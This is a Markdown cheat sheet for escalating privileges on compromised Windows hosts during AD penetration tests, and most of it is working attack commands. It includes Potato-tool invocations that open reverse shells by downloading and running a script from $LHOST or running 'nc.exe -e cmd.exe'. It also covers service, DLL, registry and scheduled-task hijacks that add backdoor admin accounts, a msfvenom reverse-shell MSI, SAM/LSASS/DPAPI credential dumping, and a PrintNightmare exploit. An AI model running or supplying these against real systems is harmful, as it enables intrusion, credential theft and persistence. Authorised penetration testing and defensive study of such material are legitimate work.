# Windows Local Privilege Escalation

Comprehensive reference for escalating privileges on compromised Windows hosts during AD pentests. Focus on local system escalation before pivoting to domain-level attacks.

## Automated Enumeration

Run these first to identify quick wins before manual checks.

### WinPEAS

```powershell
# Quiet mode with fast checks only
.\winPEASx64.exe quietfast

# Full enumeration (noisier, slower)
.\winPEASx64.exe

# Save to file
.\winPEASx64.exe quietfast > winpeas_output.txt
```

**Key output sections to review:**
- Token privileges (SeImpersonate, SeDebug, SeBackup, SeRestore, SeTakeOwnership, SeLoadDriver)
- Unquoted service paths
- Writable service binaries or paths
- AlwaysInstallElevated registry keys
- Scheduled tasks with writable binaries
- AutoLogon credentials
- Saved credentials (`cmdkey /list`)
- DPAPI masterkeys and credentials
- PowerShell history files
- Files containing passwords

### PowerUp

```powershell
# Import and run all checks
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Specific checks
Invoke-ServiceAbuse
Get-UnquotedService
Get-ModifiableServiceFile
Get-ServicePermission
Get-ModifiableScheduledTaskFile
Get-RegistryAutoLogon
```

### Seatbelt

```powershell
# Full enumeration
.\Seatbelt.exe -group=all -full

# Specific groups
.\Seatbelt.exe -group=system      # System info, patches, AV
.\Seatbelt.exe -group=user        # User context, tokens, credentials
.\Seatbelt.exe -group=misc        # Services, scheduled tasks, registry
.\Seatbelt.exe -group=remote      # Remote desktop, WinRM, firewall

# Specific checks
.\Seatbelt.exe TokenPrivileges
.\Seatbelt.exe UnquotedServicePath
.\Seatbelt.exe CredentialFiles
.\Seatbelt.exe InterestingFiles
```

### SharpUp

```powershell
# Audit mode (all checks)
.\SharpUp.exe audit

# Returns formatted output with exploitation guidance
```

### PrivescCheck

```powershell
# PowerShell-based comprehensive check
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck

# Extended mode with more verbose output
Invoke-PrivescCheck -Extended

# Save HTML report
Invoke-PrivescCheck -Report PrivescCheck_$env:COMPUTERNAME -Format HTML
```

## Token Impersonation / Potato Family

### Decision Tree

```
Do you have SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege?
│
├─ Yes → Check Windows version
│   ├─ Windows Server 2019+ / Windows 10 1809+ → GodPotato (preferred)
│   ├─ Windows Server 2016 / Windows 10 → PrintSpoofer or SweetPotato
│   ├─ Windows Server 2012 R2 / Windows 8.1 → SweetPotato
│   └─ Windows Server 2008 R2 / Windows 7 → JuicyPotato (requires correct CLSID)
│
└─ No → Skip potato family, check other vectors
```

### Check Token Privileges

```cmd
whoami /priv

# Look for:
# SeImpersonatePrivilege        Enabled
# SeAssignPrimaryTokenPrivilege Enabled
# SeBackupPrivilege             Enabled
# SeRestorePrivilege            Enabled
# SeDebugPrivilege              Enabled
# SeTakeOwnershipPrivilege      Enabled
# SeLoadDriverPrivilege         Enabled
```

### GodPotato (Windows Server 2019+ / Win10 1809+)

```cmd
# Execute command as SYSTEM
.\GodPotato.exe -cmd "cmd /c whoami"

# Get reverse shell
.\GodPotato.exe -cmd "cmd /c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/rev.ps1')"

# Add local admin
.\GodPotato.exe -cmd "cmd /c net user hacker P@ssw0rd! /add && net localgroup administrators hacker /add"

# Execute binary
.\GodPotato.exe -cmd "C:\Temp\nc.exe -e cmd.exe $LHOST $LPORT"
```

### PrintSpoofer

```cmd
# Interactive command prompt as SYSTEM
.\PrintSpoofer.exe -i -c cmd

# Execute command
.\PrintSpoofer.exe -c "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/rev.ps1')"

# 64-bit version
.\PrintSpoofer64.exe -i -c cmd
```

### SweetPotato

```cmd
# Execute command as SYSTEM
.\SweetPotato.exe -a "/c whoami"

# Get reverse shell
.\SweetPotato.exe -a "/c powershell -ep bypass IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/rev.ps1')"

# Specify CLSID and execution method
.\SweetPotato.exe -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -e WinRM -a "/c cmd"
```

### JuicyPotato (Legacy - Server 2008 R2 / Win7)

```cmd
# Requires correct CLSID for OS/Service (see http://ohpe.it/juicy-potato/CLSID/)
.\JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}

# Windows Server 2008 R2 Standard CLSID
.\JuicyPotato.exe -l 1337 -p C:\Temp\rev.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}

# Windows 7 Enterprise CLSID
.\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c nc.exe $LHOST $LPORT -e cmd.exe" -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
```

### Incognito (Meterpreter)

```
# List available tokens
incognito.exe list_tokens -u

# Impersonate token
execute -H -i -c -m -d calc.exe -f c:\windows\system32\cmd.exe -a "/c <command>"

# Meterpreter
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
```

## Service Abuse

### Unquoted Service Paths

**Detection:**

```cmd
# Find unquoted service paths
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

# PowerShell
Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -notmatch '^\".+\"' -and $_.PathName -notmatch '^C:\\Windows\\' } | Select-Object Name, PathName, StartMode, State
```

**Exploitation:**

If service path is `C:\Program Files\Vulnerable Service\service.exe`:

1. Check write permissions on directories in order:
   ```cmd
   icacls "C:\"
   icacls "C:\Program Files\"
   icacls "C:\Program Files\Vulnerable Service\"
   ```

2. Place malicious binary at writable location:
   ```cmd
   # If C:\Program.exe is writable
   copy evil.exe "C:\Program.exe"
   
   # If C:\Program Files\Vulnerable.exe is writable
   copy evil.exe "C:\Program Files\Vulnerable.exe"
   ```

3. Restart service or wait for reboot:
   ```cmd
   sc stop VulnerableService
   sc start VulnerableService
   ```

### Weak Service Binary Permissions

**Detection:**

```cmd
# Check service binary permissions
icacls "C:\Program Files\Service\service.exe"

# Look for: Everyone:(F), BUILTIN\Users:(F), BUILTIN\Users:(M)
```

**Exploitation:**

```cmd
# Backup original binary
copy "C:\Program Files\Service\service.exe" "C:\Temp\service.exe.bak"

# Replace with malicious binary
copy evil.exe "C:\Program Files\Service\service.exe"

# Restart service
sc stop ServiceName
sc start ServiceName
```

### Weak Service DACL (Configuration Permissions)

**Detection:**

```cmd
# Check service DACL
sc sdshow ServiceName

# Look for: RP (SERVICE_START), WP (SERVICE_STOP), CC (SERVICE_CHANGE_CONFIG)
# Vulnerable if non-admin users have these rights

# PowerShell ServiceHelper
Get-ServiceAcl -Name ServiceName | Format-List
```

**Exploitation:**

```cmd
# Change service binary path
sc config ServiceName binpath= "cmd /c net localgroup administrators user /add"

# Start service
sc start ServiceName

# Or use PowerUp
Invoke-ServiceAbuse -Name ServiceName -UserName "DOMAIN\user"
```

### DLL Hijacking

**Detection:**

```powershell
# List processes and their loaded DLLs
tasklist /m

# Find missing DLLs (requires ProcMon or manual testing)
# Look for LoadLibrary failures in ProcMon

# Check DLL search order for writable directories
echo %PATH%
icacls "C:\path\in\PATH"
```

**Common vulnerable paths:**
- Application directory (same folder as .exe)
- `C:\Windows\System32`
- Current working directory
- Directories in `%PATH%`

**Exploitation:**

```c
// malicious.dll payload (C example)
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net user hacker P@ssw0rd! /add");
        system("cmd.exe /c net localgroup administrators hacker /add");
    }
    return TRUE;
}
```

## Registry Abuse

### AlwaysInstallElevated

**Detection:**

```cmd
# Check if both registry keys are set to 1
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# PowerShell
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated
Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated
```

**Exploitation:**

```cmd
# Generate malicious MSI with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi -o evil.msi

# Install (runs as SYSTEM)
msiexec /quiet /qn /i evil.msi
```

### AutoRun Registry Keys

**Detection:**

```cmd
# Check for writable AutoRun entries
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Check permissions
icacls "C:\path\to\autorun\binary.exe"
```

**Exploitation:**

```cmd
# Replace AutoRun binary with malicious version
copy evil.exe "C:\Program Files\Startup\legitapp.exe"

# Or add new AutoRun entry (if you have write access)
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Temp\evil.exe"
```

### Weak Registry ACLs on Services

```cmd
# Check registry permissions for service
reg query HKLM\SYSTEM\CurrentControlSet\Services\ServiceName

# If writable, modify ImagePath
reg add HKLM\SYSTEM\CurrentControlSet\Services\ServiceName /v ImagePath /t REG_EXPAND_SZ /d "cmd /c net user hacker P@ssw0rd! /add" /f

# Start service
sc start ServiceName
```

## Scheduled Task Abuse

**Detection:**

```cmd
# List scheduled tasks
schtasks /query /fo LIST /v

# Find tasks running as SYSTEM
schtasks /query /fo LIST /v | findstr /i "SYSTEM"

# PowerShell
Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"}

# Check task binary permissions
icacls "C:\path\to\task\binary.exe"
```

**Exploitation:**

```cmd
# If task binary is writable, replace it
copy evil.exe "C:\path\to\task\binary.exe"

# Wait for scheduled execution or trigger manually
schtasks /run /tn "TaskName"

# Create new scheduled task as SYSTEM (requires admin)
schtasks /create /sc minute /mo 1 /tn "Backdoor" /tr "C:\Temp\evil.exe" /ru SYSTEM
```

## Credential Harvesting (Local)

### SAM/SYSTEM Dump

```cmd
# Method 1: Registry save (requires admin)
reg save HKLM\SAM C:\Temp\sam
reg save HKLM\SYSTEM C:\Temp\system
reg save HKLM\SECURITY C:\Temp\security

# Extract hashes offline
impacket-secretsdump -sam sam -system system -security security LOCAL

# Method 2: Volume Shadow Copy (requires admin)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\system
```

### LSASS Dump

```cmd
# Method 1: ProcDump (Sysinternals)
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Method 2: comsvcs.dll MiniDump
tasklist | findstr lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full

# Method 3: Mimikatz (direct memory)
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Parse dump offline
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
pypykatz lsa minidump lsass.dmp
```

### DPAPI

```powershell
# Enumerate DPAPI credentials
.\SharpDPAPI.exe triage

# Browser passwords
.\SharpDPAPI.exe chrome
.\SharpDPAPI.exe chromium

# Credential manager
.\SharpDPAPI.exe credentials

# WiFi passwords
netsh wlan show profile
netsh wlan show profile name="ProfileName" key=clear
```

### PowerShell History

```powershell
# Current user history
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# All users (requires admin)
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt | ForEach-Object { Write-Host "`n=== $($_.FullName) ===`n"; Get-Content $_ }

# Search for passwords
Select-String -Path C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -Pattern "password" -AllMatches
```

### Saved Credentials

```cmd
# List saved credentials
cmdkey /list

# Use saved credentials to run command as another user
runas /savecred /user:DOMAIN\admin "cmd.exe"

# Extract credentials with mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::credman" "exit"
```

## Kernel Exploits

**Use as last resort when service/configuration abuse fails.**

### Exploit Suggester Tools

```powershell
# Watson (C# - for Windows 10/Server 2016+)
.\Watson.exe

# WES-NG (Python - offline analysis)
# On target
systeminfo > systeminfo.txt

# On attacker
python wes.py systeminfo.txt --impact "Elevation of Privilege"
```

### Common Kernel Exploits

| CVE | Name | Affected Systems | Tool |
|-----|------|------------------|------|
| CVE-2021-1675 | PrintNightmare | Windows Server 2008-2019, Win7-11 | Invoke-Nightmare.ps1 |
| CVE-2021-36934 | HiveNightmare/SeriousSAM | Windows 10 1809-21H1 | HiveNightmare.exe |
| CVE-2019-0841 | AppX Deployment Service | Windows 10 < 1903 | Exploit PoC |
| CVE-2018-8120 | Win32k.sys | Windows 7-10 / Server 2008-2016 | MS18-8120.exe |
| MS17-010 | EternalBlue | Windows 7-10 / Server 2008-2016 | MS17-010.exe |
| CVE-2016-0099 | Secondary Logon | Windows 7-10 / Server 2008-2012 R2 | MS16-032.ps1 |

**PrintNightmare example:**

```powershell
# Import exploit
Import-Module .\CVE-2021-1675.ps1

# Add local admin
Invoke-Nightmare -NewUser "hacker" -NewPassword "P@ssw0rd!" -DriverName "PrintMe"
```

## Privilege Check Quick Reference

### Key Privileges and Exploitation

| Privilege | Capability | Tool |
|-----------|------------|------|
| SeImpersonatePrivilege | Impersonate tokens | GodPotato, PrintSpoofer, SweetPotato |
| SeAssignPrimaryTokenPrivilege | Assign primary tokens | Same as above |
| SeBackupPrivilege | Read any file | Backup SAM/SYSTEM, read protected files |
| SeRestorePrivilege | Write any file | Overwrite system files, service binaries |
| SeDebugPrivilege | Debug processes | Inject into SYSTEM processes, dump LSASS |
| SeTakeOwnershipPrivilege | Take ownership of objects | Take ownership of privileged files/registry |
| SeLoadDriverPrivilege | Load kernel drivers | Load malicious driver for kernel access |

### Check Current Privileges

```cmd
# List all privileges
whoami /priv

# Check specific privilege
whoami /priv | findstr "SeImpersonatePrivilege"
```

### Abuse SeBackupPrivilege

```powershell
# Backup SAM/SYSTEM
Import-Module .\SeBackupPrivilege.ps1
Set-SeBackupPrivilege
Copy-FileSeBackupPrivilege C:\Windows\System32\config\SAM C:\Temp\sam
Copy-FileSeBackupPrivilege C:\Windows\System32\config\SYSTEM C:\Temp\system
```

### Abuse SeRestorePrivilege

```powershell
# Overwrite protected file
Import-Module .\SeRestorePrivilege.ps1
Set-SeRestorePrivilege
Copy-Item C:\Temp\evil.dll C:\Windows\System32\legitimate.dll -Force
```

### Abuse SeDebugPrivilege

```cmd
# Already enabled for LSASS dump methods above
# Can also inject shellcode into SYSTEM processes
```

### Abuse SeTakeOwnershipPrivilege

```cmd
# Take ownership of protected file
takeown /f C:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant %username%:F
copy cmd.exe C:\Windows\System32\utilman.exe

# Trigger at login screen (Win+U)
```

### Abuse SeLoadDriverPrivilege

```powershell
# Load malicious kernel driver
# Requires custom driver and EOPLOADDRIVER exploit
.\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\Temp\evil.sys
```

## Quick Wins Checklist

1. **Token privileges** → GodPotato/PrintSpoofer/SweetPotato
2. **AlwaysInstallElevated** → Malicious MSI
3. **Unquoted service paths** → Hijack path with writable directory
4. **Weak service permissions** → Modify service config or binary
5. **Scheduled tasks with writable binaries** → Replace binary
6. **Saved credentials** (`cmdkey /list`) → `runas /savecred`
7. **PowerShell history** → Extract plaintext credentials
8. **Writable AutoRun entries** → Persistence + privesc on reboot
9. **Kernel exploits** → Watson/WES-NG suggestions
10. **LSASS dump** → Extract credentials for lateral movement
